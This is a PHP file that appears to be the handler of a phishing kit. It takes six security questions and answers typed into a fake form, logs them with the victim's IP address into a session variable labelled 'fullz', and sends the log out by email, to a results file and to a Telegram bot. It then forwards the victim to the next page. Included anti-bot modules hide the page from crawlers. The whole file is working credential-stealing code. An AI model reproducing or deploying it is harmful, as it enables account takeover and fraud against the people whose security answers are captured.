<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "req/config.php";

if(isset($_POST['Qus1']) && isset($_POST['Ans1'])){
    if(strlen($_POST['Ans1']) > 2){
    ///////////////////////// MAIL PART //////////////////////
        $Qus1     = $_POST['Qus1'];
        $Ans1     = $_POST['Ans1'];
        $Qus2     = $_POST['Qus2'];
        $Ans2     = $_POST['Ans2'];
        $Qus3     = $_POST['Qus3'];
        $Ans3     = $_POST['Ans3'];
        $Qus4     = $_POST['Qus4'];
        $Ans4     = $_POST['Ans4'];
        $Qus5     = $_POST['Qus5'];
        $Ans5     = $_POST['Ans5'];
        $Qus6     = $_POST['Qus6'];
        $Ans6     = $_POST['Ans6'];
        
        $PublicIP = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
|<<<<<<<<<<<< SEC QUES >>>>>>>>>>>>| 
# Question 1          : $Qus1
# Answer 1            : $Ans1     
# Question 2          : $Qus2
# Answer 2            : $Ans2   
# Question 3          : $Qus3
# Answer 3            : $Ans3
# Question 4          : $Qus4
# Answer 4            : $Ans4     
# Question 5          : $Qus5
# Answer 5            : $Ans5   
# Question 6          : $Qus6
# Answer 6            : $Ans6";
        $_SESSION['fullz'].=$Info_LOG; 
$Info_LOG.="
Ip    : $PublicIP ";       
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' 🔷🌀 ['.strtoupper($state).'] SECU SEC QUES' ;$headers = 'From: ThySec <thycybersec@thy.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
                mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
            @mkdir('../rst');
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
            fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
            sendtoTG($tgid, $Info_LOG, $tgtoken);
        };


        header("location:continu?".md5(uniqid()));
    }
    else{ header("location:secque?".$theerrkey."=c".md5(rand(100, 999999999)).""); };
}
else { header("location:secque?".$theerrkey."=".md5(rand(100, 999999999)).""); };
?>